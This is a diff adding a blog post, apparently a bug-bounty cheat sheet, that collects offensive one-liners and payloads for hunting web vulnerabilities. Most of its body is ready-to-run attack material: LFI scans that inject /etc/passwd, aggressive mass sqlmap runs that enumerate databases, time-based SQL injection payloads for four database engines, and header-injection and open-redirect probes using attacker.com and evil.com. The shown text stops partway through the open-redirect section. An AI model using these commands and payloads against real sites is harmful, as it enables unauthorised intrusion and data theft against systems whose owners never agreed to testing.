@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang=en>
+
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/baffle.js/0.2.1/baffle.min.js"></script>
+    <meta name="description" content="Some of my One Liner and Automated tools collectionsMany experienced and penetration testers, bug hunter or other people that work in offensive security use well-crafted one-liners to automate specifi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="One Liner and Automated Tools For Hunting Collections">
+<meta property="og:url" content="https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/index.html">
+<meta property="og:site_name" content="❯ ＰＡＹＡＳ０">
+<meta property="og:description" content="Some of my One Liner and Automated tools collectionsMany experienced and penetration testers, bug hunter or other people that work in offensive security use well-crafted one-liners to automate specifi">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.hackthebox.eu/badge/image/128965">
+<meta property="article:published_time" content="2025-04-17T06:40:51.000Z">
+<meta property="article:modified_time" content="2025-07-07T06:53:25.169Z">
+<meta property="article:author" content="Medz">
+<meta property="article:tag" content="pentest">
+<meta property="article:tag" content="offensive security">
+<meta property="article:tag" content="bug bounty">
+<meta property="article:tag" content="tool">
+<meta property="article:tag" content="cli">
+<meta property="article:tag" content="gui-tool">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.hackthebox.eu/badge/image/128965">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon-1.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>One Liner and Automated Tools For Hunting Collections</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="❯ ＰＡＹＡＳ０" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2025-02-09/tools/automation/Practical-Guide-For-Reconnaissance/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&text=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&title=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&is_video=false&description=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=One Liner and Automated Tools For Hunting Collections&body=Check out this article: https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&title=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&title=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&title=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&title=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&name=One Liner and Automated Tools For Hunting Collections&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&t=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Some-of-my-One-Liner-and-Automated-tools-collections"><span class="toc-number">1.</span> <span class="toc-text">Some of my One Liner and Automated tools collections</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#One-Liner-to-find-LFI"><span class="toc-number">1.1.</span> <span class="toc-text">One Liner to find LFI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#One-Liner-to-find-SQLi-with-tools"><span class="toc-number">1.2.</span> <span class="toc-text">One Liner to find SQLi with tools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#With-SQLMap-to-find-SQLi"><span class="toc-number">1.3.</span> <span class="toc-text">With SQLMap to find SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sample-SQLi-Payloads"><span class="toc-number">1.4.</span> <span class="toc-text">Sample SQLi Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Header-Based-SQLi"><span class="toc-number">1.5.</span> <span class="toc-text">Header-Based SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#One-Liner-to-detect-SQLi-via-Headers"><span class="toc-number">1.6.</span> <span class="toc-text">One Liner to detect SQLi via Headers</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#One-Liner-to-detect-Host-Header-Injection"><span class="toc-number">1.7.</span> <span class="toc-text">One Liner to detect Host Header Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Detect-Open-Redirect-vulnerabilities-with-one-liner"><span class="toc-number">1.8.</span> <span class="toc-text">Detect Open Redirect vulnerabilities with one-liner</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Detecting-Open-Redirect-with-httpx-toolkit"><span class="toc-number">1.9.</span> <span class="toc-text">Detecting Open Redirect with httpx-toolkit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#With-custom-list-of-Open-Redirects-Payloads"><span class="toc-number">1.10.</span> <span class="toc-text">With custom list of Open Redirects Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Using-gau-and-gf"><span class="toc-number">1.11.</span> <span class="toc-text">Using gau and gf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Using-curl-to-detect-Open-Redirect"><span class="toc-number">1.12.</span> <span class="toc-text">Using curl to detect Open Redirect</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Finding-XSS-with-One-Liner"><span class="toc-number">2.</span> <span class="toc-text">Finding XSS with One-Liner</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Detect-URLs-with-parameters"><span class="toc-number">2.1.</span> <span class="toc-text">Detect URLs with parameters</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reading-js-file-to-find-RXSS-and-Open-Redirect-with-linkfinder"><span class="toc-number">2.2.</span> <span class="toc-text">Reading .js file to find RXSS and Open Redirect with linkfinder</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+        <div class="content index py4">
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <div class="firefly"></div>
+        <embed src="/html/Kalimba.mp3" loop="true" autostart="true" width="2" height="0">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        One Liner and Automated Tools For Hunting Collections
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">❯ ＰＡＹＡＳ０</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-17T06:40:51.000Z" itemprop="datePublished">17-04-2025</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/tools/">tools</a> › <a class="category-link" href="/categories/tools/automation/">automation</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/bug-bounty/" rel="tag">bug bounty</a>, <a class="tag-link-link" href="/tags/cli/" rel="tag">cli</a>, <a class="tag-link-link" href="/tags/gui-tool/" rel="tag">gui-tool</a>, <a class="tag-link-link" href="/tags/offensive-security/" rel="tag">offensive security</a>, <a class="tag-link-link" href="/tags/pentest/" rel="tag">pentest</a>, <a class="tag-link-link" href="/tags/tool/" rel="tag">tool</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Some-of-my-One-Liner-and-Automated-tools-collections"><a href="#Some-of-my-One-Liner-and-Automated-tools-collections" class="headerlink" title="Some of my One Liner and Automated tools collections"></a>Some of my One Liner and Automated tools collections</h2><p>Many experienced and penetration testers, bug hunter or other people that work in offensive security use well-crafted one-liners to automate specific parts of their workflow — from passive recon to vulnerability detection.</p>
+<p>In this post I’ll share some collections of tools and one-liner payloads designed to automate the discovery of common web vulnerabilities such as <code>XSS</code>, <code>SQLi</code>, <code>SSRF</code>, <code>LFI</code>, <code>open redirect</code>, <code>idor</code>, <code>keys</code>, <code>secrets</code>, etc. Instead of building full frameworks, these short commands combine widely-used utilities like <code>gf</code>, <code>httpx</code>, <code>ffuf</code>, and <code>gau</code> to produce fast, repeatable, and high-signal results — often with a single line of code.</p>
+<hr>
+<h3 id="One-Liner-to-find-LFI"><a href="#One-Liner-to-find-LFI" class="headerlink" title="One Liner to find LFI"></a>One Liner to find LFI</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> targets.txt | (gau || hakrawler || waybackurls || katana) |  grep <span class="string">&quot;=&quot;</span> |  dedupe | httpx -silent -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr <span class="string">&quot;root:[x*]:0:0:&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">waybackurls king.ph | gf lfi | qsreplace <span class="string">&quot;/etc/passwd&quot;</span> | xargs -I% -P 25 sh -c <span class="string">&#x27;curl -s &quot;%&quot; 2&gt;&amp;1 | grep -q &quot;root:x&quot; &amp;&amp; echo &quot;VULN! %&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="One-Liner-to-find-SQLi-with-tools"><a href="#One-Liner-to-find-SQLi-with-tools" class="headerlink" title="One Liner to find SQLi with tools"></a>One Liner to find SQLi with tools</h3><p><strong>|</strong> <strong>For single URL:</strong><br>Using <a target="_blank" rel="noopener" href="https://github.com/coffinxp/customBsqli/blob/main/lostsec.py">lostsec</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">paramspider -d yourtarget.com -o urls.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> output/urls.txt | sed <span class="string">&#x27;s/FUZZ//g&#x27;</span> &gt; final.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># run the tool</span></span><br><span class="line">python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> yourtarget.com | gau --mc 200 | urldedupe &gt; urls.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> urls.txt | grep -E <span class="string">&quot;.php|.asp|.aspx|.cfm|.jsp&quot;</span> | grep <span class="string">&#x27;=&#x27;</span> | <span class="built_in">sort</span> &gt; output.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> output.txt | sed <span class="string">&#x27;s/=.*/=/&#x27;</span> &gt; final.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># now run the tool</span></span><br><span class="line">python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> yourtarget.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe &gt; output.txt</span><br><span class="line"></span><br><span class="line">katana -u yourtarget.com -d 5 | grep <span class="string">&#x27;=&#x27;</span> | urldedupe | anew output.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> output.txt | sed <span class="string">&#x27;s/=.*/=/&#x27;</span> &gt; final.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># run the tool</span></span><br><span class="line">python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="With-SQLMap-to-find-SQLi"><a href="#With-SQLMap-to-find-SQLi" class="headerlink" title="With SQLMap to find SQLi"></a>With <code>SQLMap</code> to find <code>SQLi</code></h3><p><strong>|</strong> For Single domain:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei <span class="string">&#x27;asp|php|jsp|jspx|aspx&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>|</strong> find <code>URLs</code> with <code>parameters</code> (common SQLi entry points):</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> https://example.com | gau | uro | grep -E <span class="string">&quot;.php|.asp|.aspx|.jspx|.jsp&quot;</span> | grep <span class="string">&quot;=&quot;</span> &gt; urls.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>|</strong> You can also used <code>katana</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E <span class="string">&quot;.php|.asp|.aspx|.jspx|.jsp&quot;</span> &gt; urls2.txt</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>|</strong> Using <code>gf</code> tool cleaned <code>URLS</code> with prone to <code>SQL</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> urls1.txt urls2.txt | gf sqli | uro &gt; cleaned-sql.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>|</strong> Now you can run the <code>sqlmap</code> againts the <code>URLS</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -m cleaned-sql.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gf sqli &gt; cleaned-sql.txt; sqlmap -m cleaned-sql.txt --batch --dbs --risk 2 --level 5 --random-agent</span><br></pre></td></tr></table></figure>
+
+<h3 id="Sample-SQLi-Payloads"><a href="#Sample-SQLi-Payloads" class="headerlink" title="Sample SQLi Payloads"></a>Sample <code>SQLi</code> Payloads</h3><p><strong>|</strong> MySQL</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- Basic time-based delay</span></span><br><span class="line"><span class="keyword">SELECT</span> SLEEP(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Inline injection with logic</span></span><br><span class="line"><span class="number">0</span><span class="string">&#x27;XOR(if(now()=sysdate(),sleep(10),0))XOR&#x27;</span>Z</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Using benchmark for delay (CPU-based)</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>), CONCAT(<span class="built_in">FLOOR</span>(RAND()<span class="operator">*</span><span class="number">2</span>),(<span class="keyword">SELECT</span> SLEEP(<span class="number">5</span>))) <span class="keyword">AS</span> x <span class="keyword">FROM</span> information_schema.tables <span class="keyword">GROUP</span> <span class="keyword">BY</span> x) y);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Boolean logic delay</span></span><br><span class="line"><span class="string">&#x27; OR IF(1=1, SLEEP(10), 0)-- -</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>|</strong> PostgreSQL</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- Standard time-based delay</span></span><br><span class="line"><span class="keyword">SELECT</span> pg_sleep(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Conditional delay with string concatenation</span></span><br><span class="line"><span class="string">&#x27; OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) &lt; interval &#x27;</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">10</span><span class="string">&#x27;) </span></span><br><span class="line"><span class="string">     THEN (SELECT &#x27;</span><span class="number">1</span><span class="string">&#x27; || pg_sleep(10)) ELSE &#x27;</span><span class="number">0</span><span class="string">&#x27; END)=&#x27;</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- More concise version</span></span><br><span class="line"><span class="string">&#x27; OR 1=1; SELECT pg_sleep(5);-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- Using random() for variability</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">OR</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (random() <span class="operator">&lt;</span> <span class="number">0.5</span>) <span class="keyword">THEN</span> pg_sleep(<span class="number">5</span>) <span class="keyword">ELSE</span> pg_sleep(<span class="number">0</span>) <span class="keyword">END</span>);<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>|</strong> MsSQL</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- Basic delay</span></span><br><span class="line">WAITFOR DELAY <span class="string">&#x27;00:00:10&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Inline SQLi payload</span></span><br><span class="line"><span class="string">&#x27;; WAITFOR DELAY &#x27;</span><span class="number">00</span>:<span class="number">00</span>:<span class="number">05</span><span class="string">&#x27;; --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- Conditional delay</span></span><br><span class="line"><span class="string">IF (1=1) WAITFOR DELAY &#x27;</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">10</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- Using IF EXISTS for more realism</span></span><br><span class="line"><span class="string">&#x27;</span>; IF <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users) WAITFOR DELAY <span class="string">&#x27;00:00:07&#x27;</span>;<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>|</strong> Oracle</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- Basic time delay using DBMS_PIPE</span></span><br><span class="line"><span class="keyword">BEGIN</span> DBMS_PIPE.RECEIVE_MESSAGE(<span class="string">&#x27;a&#x27;</span>,<span class="number">10</span>); <span class="keyword">END</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- SQLi inline payload</span></span><br><span class="line"><span class="string">&#x27; OR 1=1; BEGIN DBMS_PIPE.RECEIVE_MESSAGE(&#x27;</span>a<span class="string">&#x27;,10); END;--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- Conditional check with delay</span></span><br><span class="line"><span class="string">DECLARE v INTEGER; BEGIN IF 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE(&#x27;</span>a<span class="string">&#x27;,10); END IF; END;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Header-Based-SQLi"><a href="#Header-Based-SQLi" class="headerlink" title="Header-Based SQLi"></a>Header-Based SQLi</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User-Agent: 0<span class="string">&#x27;XOR(if(now()=sysdate(),sleep(10),0))XOR&#x27;</span>Z</span><br><span class="line">X-Forwarded-For: 0<span class="string">&#x27;XOR(if(now()=sysdate(),sleep(10),0))XOR&#x27;</span>Z</span><br><span class="line">Referer: <span class="string">&#x27;+(select*from(select(if(1=1,sleep(20),false)))a)+&#x27;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="One-Liner-to-detect-SQLi-via-Headers"><a href="#One-Liner-to-detect-SQLi-via-Headers" class="headerlink" title="One Liner to detect SQLi via Headers"></a>One Liner to detect SQLi via Headers</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">time curl -s -H <span class="string">&quot;User-Agent: 0&#x27;XOR(if(now()=sysdate(),sleep(10),0))XOR&#x27;Z&quot;</span> <span class="string">&quot;https://yourtarget.com/vulnerable-endpoint&quot;</span></span><br><span class="line"></span><br><span class="line">time curl -s -H <span class="string">&quot;X-Forwarded-For: 0&#x27;XOR(if(now()=sysdate(),sleep(10),0))XOR&#x27;Z&quot;</span> <span class="string">&quot;https://yourtarget.com/vulnerable-endpoint&quot;</span></span><br><span class="line"></span><br><span class="line">time curl -s -H <span class="string">&quot;Referer: &#x27;+(select*from(select(if(1=1,sleep(20),false)))a)+&#x27;\&quot;&quot;</span> <span class="string">&quot;https://yourtarget.com/vulnerable-endpoint&quot;</span></span><br><span class="line"></span><br><span class="line">time curl <span class="string">&quot;https://yourtarget.com/page.php?id=if(now()=sysdate(),sleep(10),0)/*&#x27;XOR(if(now()=sysdate(),sleep(10),0))OR&#x27;&quot;</span>XOR(<span class="keyword">if</span>(now()=sysdate(),<span class="built_in">sleep</span>(10),0))OR<span class="string">&quot;*/&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h3 id="One-Liner-to-detect-Host-Header-Injection"><a href="#One-Liner-to-detect-Host-Header-Injection" class="headerlink" title="One Liner to detect Host Header Injection"></a>One Liner to detect Host Header Injection</h3><p><strong>|</strong> Using <code>Waybackurls</code> and <code>Gau</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> collections.txt | <span class="keyword">while</span> <span class="built_in">read</span> url; <span class="keyword">do</span> curl -H <span class="string">&quot;Host: attacker.com&quot;</span> <span class="string">&quot;<span class="variable">$url</span>&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>|</strong> Using <code>FFuF</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -u https://target.com -H <span class="string">&quot;Host: FUZZ&quot;</span> -w hosts.txt</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h3 id="Detect-Open-Redirect-vulnerabilities-with-one-liner"><a href="#Detect-Open-Redirect-vulnerabilities-with-one-liner" class="headerlink" title="Detect Open Redirect vulnerabilities with one-liner"></a>Detect Open Redirect vulnerabilities with one-liner</h3><p><strong>|</strong> When you have URLS collected:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> urls.txt | gau --o finalurls1.txt</span><br><span class="line"><span class="built_in">cat</span> urls.txt | katana -d 2 -o finalurls2.txt</span><br><span class="line"><span class="built_in">cat</span> urls.txt | urlfinder -o finalurls3.txt</span><br><span class="line"><span class="built_in">cat</span> urls.txt | hakrawler &gt; finalurls4.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>|</strong> Merge all the <code>URLS</code> collected:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> urls1.txt urls2.txt urls3.txt | uro | <span class="built_in">sort</span> -u | <span class="built_in">tee</span> final.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>|</strong> Now you can use filters to find <code>Redirect Parameters</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> final.txt | grep -Pi <span class="string">&quot;returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=&quot;</span> | <span class="built_in">tee</span> redirect_params.txt</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>|</strong> Find <code>Redirect Parameters</code> with <code>gf</code> tool</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> final.txt | gf redirect | uro | <span class="built_in">sort</span> -u | <span class="built_in">tee</span> redirect_params.txt</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Detecting-Open-Redirect-with-httpx-toolkit"><a href="#Detecting-Open-Redirect-with-httpx-toolkit" class="headerlink" title="Detecting Open Redirect with httpx-toolkit"></a>Detecting Open Redirect with <code>httpx-toolkit</code></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> redirect_params.txt | qsreplace <span class="string">&quot;https://evil.com&quot;</span> | httpx-toolkit -silent -fr -mr <span class="string">&quot;evil.com&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="With-custom-list-of-Open-Redirects-Payloads"><a href="#With-custom-list-of-Open-Redirects-Payloads" class="headerlink" title="With custom list of Open Redirects Payloads"></a>With custom list of Open Redirects Payloads</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> redirect_params.txt | <span class="keyword">while</span> <span class="built_in">read</span> url; <span class="keyword">do</span> <span class="built_in">cat</span> path/to/wordlist.txt | <span class="keyword">while</span> <span class="built_in">read</span> payload; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$url</span>&quot;</span> | qsreplace <span class="string">&quot;<span class="variable">$payload</span>&quot;</span>; <span class="keyword">done</span>; <span class="keyword">done</span> | httpx-toolkit -silent -fr -mr <span class="string">&quot;google.com&quot;</span></span><br></pre></td></tr></table></figure>
+
